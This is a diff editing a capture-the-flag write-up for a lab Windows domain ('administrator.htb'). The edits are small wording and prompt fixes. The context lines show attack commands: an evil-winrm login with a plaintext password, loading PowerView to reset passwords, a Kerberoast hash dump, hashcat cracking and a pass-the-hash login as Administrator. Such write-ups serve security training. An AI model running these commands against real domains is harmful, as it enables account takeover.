@@ -98,7 +98,6 @@ Let's load `PowerView` and change user `michael`'s password.
 
 ```shell
 evil-winrm-py PS C:\Users\olivia\Documents> mkdir C:\Temp
-cd C:
 
     Directory: C:\
 
@@ -106,6 +105,7 @@ cd C:
 Mode                 LastWriteTime         Length Name                                                                  
 ----                 -------------         ------ ----                                                                  
 d-----         11/5/2026   2:11 PM                Temp                                                                  
+evil-winrm-py PS C:\Users\olivia\Documents> cd C:\Temp
 
 
 evil-winrm-py PS C:\Temp> loadps /opt/powershell-modules/powerview.ps1
@@ -134,7 +134,7 @@ WINRM       10.10.11.42    5985   DC               [*] Windows Server 2022 Build
 WINRM       10.10.11.42    5985   DC               [+] administrator.htb\michael:Password123! (Pwn3d!)
 ```
 
-This user could also `WinRM` into the machine. I logged in as `michael` and changed `benjamin`'s password.
+I logged in as `michael` and changed `benjamin`'s password.
 
 ```shell
 evil-winrm-py -i 10.10.11.42 -u michael -p 'Password123!'
@@ -310,16 +310,17 @@ LDAP        10.10.11.42    389    DC               [*] sAMAccountName: ethan, me
 LDAP        10.10.11.42    389    DC               $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$d6b5754d04ae46ad004842e3137d1b07$484f38cf573fe9aeb0a0e9fec8e3b7776522440e3eafa3b709322dbef39c4376fc3dd799b627b23c2e620d537bb9e25ec99f39d5a8ea6f6e1404c6e6f3a331d7cfe166ad54cd11c057445d93ab9204c8b5d884c78859e1cdaad28d31ee6f72c606ed02fe2f3e2a1a6c3ab9dd09c35b090b7de83488d0ed8e76e2eff11a2aae88306e58b7137f1ae963ddbebdbacdacad0237fdb8c2df16d6a20bcdda8418de73e15a448fffd63165519a893b0fa8aba1df5d32929a432cc1df61a36a2f9cbae6a92fceb73b0544c58ccde80eca903f09cbff302c2eb5ba67c381ff56b08d41526e5ecab5bcc156561c7ad0b7815d64e620c006a18575d5daa684d955069fa205bc3ac68c260fa7db12dc69def87ba4cc41a522aa4f5e47c29fa769eb2b33c186d3bdeed5056ce406624450bd7e803cce204324d8ea1d190d80849fd842d8df8ec4746088b6e4758bebc11d21c65448da2ec5739d3804b0fcc6785a036b28af521ebc0e765b6938a3ce810d6e65e2ca41ae1f883882e36a9e7c6b533dfe2bee99b08207e10fa6c19c3df1318ccb70a41a328df5c854ffe050742ff5bf79f1d28ebbe99f4050506b3ea657dcb3df0be3d7d89f4855c7f1527c0e208204152b5de45a551c296e5fedd5ab446a0afb8c2897ff50e2fec16c2f2572b56d7605b915eb23f4770140ad45784e7ae6c43da49c13ae5dedda6f072b6c59d944bf75408d983b23d315283dc57f5ff587dbb1dbd61bf9b9d97825449a9e3103bbe73a84aeea54d1a8406bae921215f3c122c3d4e028dfe8449cd2f143dfd0f7e411675298d0ecf34372c33985ce204c8cca6072fa0512777b1a0f7dd2b66c96036fe27ed85f222fe41536885c951fa5fd772fa75075622dfbefa20dfae06d55f1531f81c18e1c209162f1836d00d8c230d8bae946737b5d65584960a8cd7ec70dbf1f4fbd80429ae87d8089449af98ae7a0280fb913fd4454482775b530337bd110e7cf778819e70a7c045c0bb33e71b0b44ee8c579abdfe78155d2bbc49136f953df578b11355d9c0087ae8644ba85f0ae7b5d87b690c2479ca837a6817fb356f23ccd54f9ca666d2cca233f25d9f0e7478c4e4ebe13befef6ad1a28c4703c4b0a2a92220825ec172d74d9b4874fe76496f61274b483e9f397ee477b45c7f0a68f630fa4a74976d6e7e58a3be153db30f5b335f66895ac7021daab2d4ecdf96bbd95bf6acf6781db0b34d99320b195b292d213143d120123968dd17e8bfab96c1e50701a00f54f9347cb55cac48a18a1ab29fe760f3682c5e49b2ab83043434f9312031c5ac5b813a9ceb541db0b6d510a031c10d728a51d810b2fb1a0099e34f7f38a46ff901f4fe001f47e29365d4a3e27d588498fd88661afaf459e650ae774372bb6a56c7719bcc6523eccf5c555c2c93d70b7f5e1f8be5551d5fec6b2b4938f13bc2115fc493cb9fd57f5a24692021eaae95dfaf1b5c0a276ff2a415353c36caaa20c51db9c9f2aef4c4ede142a72059e3482da9924807adc515c775cff014aca47
 ```
 
-And lets clean up.
+Let's clean up.
 
 ```shell
 evil-winrm-py PS C:\Users\emily\Documents> Set-DomainObject -Identity ethan -Clear serviceprincipalname -Verbose
 ```
 
+
 We got the ticket, which I cracked with `hashcat`.
 
 ```shell
-hashcat hashes.txt $ROCKYOU
+hashcat output.txt $ROCKYOU
 
 <SNIP>
 
@@ -367,7 +368,6 @@ evil-winrm-py -i 10.10.11.42 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2
 
 [*] Connecting to '10.10.11.42:5985' as 'Administrator'
 evil-winrm-py PS C:\Users\Administrator\Documents> cd ../Desktop
-ls
 evil-winrm-py PS C:\Users\Administrator\Desktop> ls
 
 
